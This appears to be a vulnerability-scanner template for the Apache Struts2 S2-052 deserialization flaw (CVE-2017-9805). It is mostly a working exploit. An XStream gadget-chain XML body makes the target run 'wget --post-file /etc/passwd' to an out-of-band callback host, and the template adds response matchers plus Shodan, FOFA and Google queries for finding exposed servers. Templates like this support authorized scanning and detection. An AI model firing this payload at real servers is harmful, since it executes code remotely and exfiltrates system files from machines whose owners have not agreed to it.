http:
- body: "<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n     \
    \ <flags>0</flags>\n      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"\
    >\n        <dataHandler>\n          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"\
    >\n            <is class=\"javax.crypto.CipherInputStream\">\n              <cipher\
    \ class=\"javax.crypto.NullCipher\">\n                <initialized>false</initialized>\n\
    \                <opmode>0</opmode>\n                <serviceIterator class=\"\
    javax.imageio.spi.FilterIterator\">\n                  <iter class=\"javax.imageio.spi.FilterIterator\"\
    >\n                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n\
    \                    <next class=\"java.lang.ProcessBuilder\">\n             \
    \         <command>\n                        <string>wget</string>\n         \
    \               <string>--post-file</string>\n                        <string>/etc/passwd</string>\n\
    \              <string>{{interactsh-url}}</string>\n                      </command>\n\
    \                      <redirectErrorStream>false</redirectErrorStream>\n    \
    \                </next>\n                  </iter>\n                  <filter\
    \ class=\"javax.imageio.ImageIO$ContainsFilter\">\n                    <method>\n\
    \                      <class>java.lang.ProcessBuilder</class>\n             \
    \         <name>start</name>\n                      <parameter-types/>\n     \
    \               </method>\n                    <name>asdasd</name>\n         \
    \         </filter>\n                  <next class=\"string\">asdasd</next>\n\
    \                </serviceIterator>\n                <lock/>\n              </cipher>\n\
    \              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n \
    \             <ibuffer></ibuffer>\n              <done>false</done>\n        \
    \      <ostart>0</ostart>\n              <ofinish>0</ofinish>\n              <closed>false</closed>\n\
    \            </is>\n            <consumed>false</consumed>\n          </dataSource>\n\
    \          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n\
    \      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <jdk.nashorn.internal.objects.NativeString\
    \ reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n \
    \ <entry>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"\
    />\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"\
    />\n  </entry>\n</map>\n"
  headers:
    Content-Type: application/xml
  matchers:
  - condition: and
    type: word
    words:
    - Debugging information
    - com.thoughtworks.xstream.converters.collections.MapConverter
  - status:
    - 500
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/struts2-rest-showcase/orders/3'
  - '{{BaseURL}}/orders/3'
id: CVE-2017-9805
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:apache:struts:2.1.2:*:*:*:*:*:*:*
    cve-id: CVE-2017-9805
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-502
    epss-percentile: 0.99946
    epss-score: 0.94322
  description: The REST Plugin in Apache Struts 2.1.1 through 2.3.x before 2.3.34
    and 2.5.x before 2.5.13 uses an XStreamHandler with an instance of XStream for
    deserialization without any type of filtering, which can lead to remote code execution
    when deserializing XML payloads.
  impact: 'Remote code execution

    '
  metadata:
    fofa-query:
    - body="struts problem report"
    - title="struts2 showcase"
    - body="apache struts"
    google-query: intitle:"struts2 showcase"
    max-request: 2
    product: struts
    shodan-query:
    - http.html:"apache struts"
    - http.title:"struts2 showcase"
    - http.html:"struts problem report"
    vendor: apache
  name: Apache Struts2 S2-052 - Remote Code Execution
  reference:
  - http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-9805-3889403.html
  - https://struts.apache.org/docs/s2-052.html
  - https://nvd.nist.gov/vuln/detail/CVE-2017-9805
  - http://www.securitytracker.com/id/1039263
  - https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax
  remediation: 'Apply the latest security patches or upgrade to a non-vulnerable version
    of Apache Struts2.

    '
  severity: high
  tags: cve,cve2017,apache,rce,struts,kev,vkev,vuln
